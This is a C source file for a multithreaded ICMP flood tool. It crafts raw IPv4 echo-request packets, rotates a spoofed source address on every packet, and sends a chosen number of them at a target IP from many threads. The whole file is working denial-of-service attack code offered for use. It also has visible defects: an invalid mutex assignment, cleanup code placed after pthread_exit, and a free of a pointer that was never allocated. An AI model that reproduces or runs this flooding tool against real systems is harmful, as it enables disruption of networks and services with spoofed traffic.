#include <stdlib.h>
#include <string.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <arpa/inet.h>
#include <errno.h>
#include <sys/socket.h>
#include <stdio.h>
#include <unistd.h>
#include <signal.h>
#include <wait.h>
#include <pthread.h>
#include "icmp_flood.h"

#include "make_ipv4.h"

int icmp_total;
int icmp_produced;
int icmp_received;

char *dest_ip;
char *src_ip;

pthread_mutex_t mutex;
pthread_cond_t cond;

void icmp_flood_print_usage()
{
	printf("Usage : [Src-IP] [Dest-IP] [# thread] [# requests] \n");
}

void* generate_icmp_request(void *data) {
	int thread_id = *((int*) data);
	int sock = make_socket(IPPROTO_ICMP);
	while (1) {

		struct icmp *p;
		char buffer[sizeof(struct icmp)];

		memset(buffer, 0x00, sizeof(struct icmp));

		struct iphdr ipv4_h;
		ipv4_h = prepare_empty_ipv4();
		ipv4_h = ipv4_set_protocol(ipv4_h, IPPROTO_ICMP);
		ipv4_h = ipv4_set_saddr(ipv4_h, inet_addr(src_ip));

		//modify src_ip, increment 1.
		next_ip_addr(src_ip, 1);

		ipv4_h = ipv4_set_daddr(ipv4_h, inet_addr(dest_ip));

		p = (struct icmp*) buffer;
		p->icmp_type = ICMP_ECHO;
		p->icmp_code = 0;
		p->icmp_cksum = 0;
		p->icmp_seq = htons(icmp_produced);
		p->icmp_id = getpid();
		p->icmp_cksum = in_cksum((u_short*) p, sizeof(struct icmp));

		char *packet = packet_assemble(ipv4_h, p, sizeof(struct icmp));
		ipv4_h = ipv4_add_size(ipv4_h, sizeof(struct icmp));

		pthread_mutex_lock(&mutex);

		if (icmp_produced >= icmp_total) {
			pthread_mutex_unlock(&mutex);
			pthread_cond_broadcast(&cond);
			return 0;
		}

		send_packet(sock,ipv4_h, packet, rand() % 50000 + 1000);
		free(packet);
		icmp_produced++;

		pthread_mutex_unlock(&mutex);
	}
	close(sock);
	return 0;
}

void icmp_flood_run(char *argv[]) {

	src_ip = (char*) malloc(sizeof(char) * 20);

	int argc=0;
	while(argv[argc]!=NULL)
	{
		argc++;
	}

	if (argc != 4) {
		fprintf(stderr,
				"Usage : [Src-IP] [Dest-IP] [# thread] [# requests] \n");
		return ;
	}

	strcpy(src_ip, argv[0]);

	mutex = PTHREAD_MUTEX_INITIALIZER;

	icmp_total = atoi(argv[3]);
	icmp_produced = 0;
	icmp_received = 0;

	int num_threads = atoi(argv[2]);

	dest_ip = argv[1];

	int *generate_thread_id;
	pthread_t *generate_thread;

	int *receive_thread_id;
	pthread_t *receive_thread;

	generate_thread_id = (int*) malloc(sizeof(int) * num_threads);
	generate_thread = (pthread_t*) malloc(sizeof(pthread_t) * num_threads);
	int i;

	printf("Sending %d ICMP requests to %s using %d threads\n", icmp_total,
			dest_ip, num_threads);
	for (i = 0; i < num_threads; i++)
		generate_thread_id[i] = i;

	for (i = 0; i < num_threads; i++) {
		pthread_create(&generate_thread[i], NULL, generate_icmp_request,
				(void*) &generate_thread_id[i]);
	}

	for (i = 0; i < num_threads; i++) {
		void *status;
		pthread_join(generate_thread[i], &status);
		printf("thread %d joined\n", i);
	}

	pthread_mutex_destroy(&mutex);
	pthread_exit(NULL);

	free(generate_thread_id);
	free(generate_thread);
	free(receive_thread_id);
	free(receive_thread);
	free(src_ip);
}

